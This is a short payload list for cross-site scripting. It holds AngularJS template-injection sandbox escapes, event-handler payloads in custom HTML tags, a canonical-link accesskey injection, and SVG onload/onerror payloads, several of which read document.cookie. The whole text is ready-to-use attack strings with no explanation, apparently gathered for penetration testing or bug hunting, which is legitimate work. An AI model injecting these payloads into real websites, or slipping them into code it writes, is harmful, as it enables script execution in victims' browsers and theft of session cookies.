Payloads list 
this is for the angular JS 
```
{{constructor.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{[].filter.constructor('alert(1)')()}}
{{constructor.constructor('\x61lert(1)')()}}
{{constructor.constructor(String.fromCharCode(97,108,101,114,116,40,49,41))()}}
{{{}['constructor']['constructor']('alert(1)')()}}
{{[1,2,3].map.constructor('alert(1)')()}}
{{toString.constructor('alert(1)')()}}
# **{{[].join.constructor('alert(1)')()}}**
```


### **costum tags xss** 

```
<foo autofocus onfocus=alert(document.cookie) tabindex=1>test</foo>
<xss onmouseenter=alert(document.cookie)>move mouse here</xss>
<bar draggable=true ondragstart=alert(document.cookie)>drag me</bar>
<custom onmouseover=alert(document.cookie)>hover me</custom>
<xss id=x tabindex=1 onfocus=alert(document.cookie) autofocus>

```

###### conical acess key 
```
`?%27accesskey=%27x%27onclick=%27alert(1)`
```

Svg tags 

```
<svg><image href="x" onerror="alert(document.cookie)"></image></svg>
<svg onload=alert(document.cookie)>
<svg><image href="javascript:alert(document.cookie)"></svg>

```
